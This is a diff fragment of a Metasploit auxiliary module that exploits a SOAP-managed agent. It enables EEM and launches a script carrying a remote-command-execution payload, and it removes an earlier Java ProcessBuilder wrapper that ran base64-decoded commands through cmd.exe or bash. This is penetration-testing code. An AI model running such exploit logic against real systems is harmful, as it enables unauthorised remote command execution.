@@ -125,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def action_ssrf
     setup_xml_and_variables
-    get_agent_os(@agent_name)
+    check_agent(@agent_name)
 
     print_status("Enable EEM on agent: #{@agent_name}")
     enable_eem(@agent_name)
@@ -145,23 +145,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def action_exec
     setup_xml_and_variables
-    command = "var d = Packages.java.util.Base64.getDecoder().decode('#{Rex::Text.encode_base64(@rce_command)}');"
-    command << 'var c = new Packages.java.lang.String(d);'
-    command << 'var b = new Packages.java.lang.ProcessBuilder();'
-    agent_os = get_agent_os(@agent_name) || 'Unknown OS'
-    case agent_os
-    when /windows/i
-      command << 'b.command("cmd.exe","/c",c).start().waitFor();'
-    else
-      command << 'b.command("bash","-c",c).start().waitFor();'
-    end
-    @rce_payload = make_rce_payload(command)
+    check_agent(@agent_name)
 
     print_status("Enable EEM on agent: #{@agent_name}")
     enable_eem(@agent_name)
 
+    rce_payload = make_rce_payload(@rce_command)
     print_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
-    send_soap_request(make_soap_body(@agent_name, @script_name, @rce_payload))
+    send_soap_request(make_soap_body(@agent_name, @script_name, rce_payload))
 
     print_status("Stop script: #{@script_name} on agent: #{@agent_name}")
     stop_script_in_agent(@agent_name, @script_name)
